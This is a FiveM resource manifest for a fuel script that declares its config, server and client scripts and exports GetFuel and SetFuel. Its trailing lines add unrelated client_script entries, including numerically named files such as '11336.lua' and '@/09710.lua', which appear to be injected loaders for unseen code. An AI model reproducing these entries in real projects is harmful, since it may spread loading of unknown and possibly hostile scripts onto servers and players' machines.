resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

server_scripts {
	'config.lua',
	'source/fuel_server.lua'
}

client_scripts {
	'config.lua',
	'source/fuel_client.lua'
}

exports {
	'GetFuel',
	'SetFuel'
}

client_script "11336.lua"
client_script "lucidcity-anticheat.lua"
client_script "antikickvehicle.lua"
client_script "anti-stungun.lua"
client_script "anti-update.lua"
client_script "block-menus.lua"
client_script "block-menus2.lua"
client_script '@/09710.lua'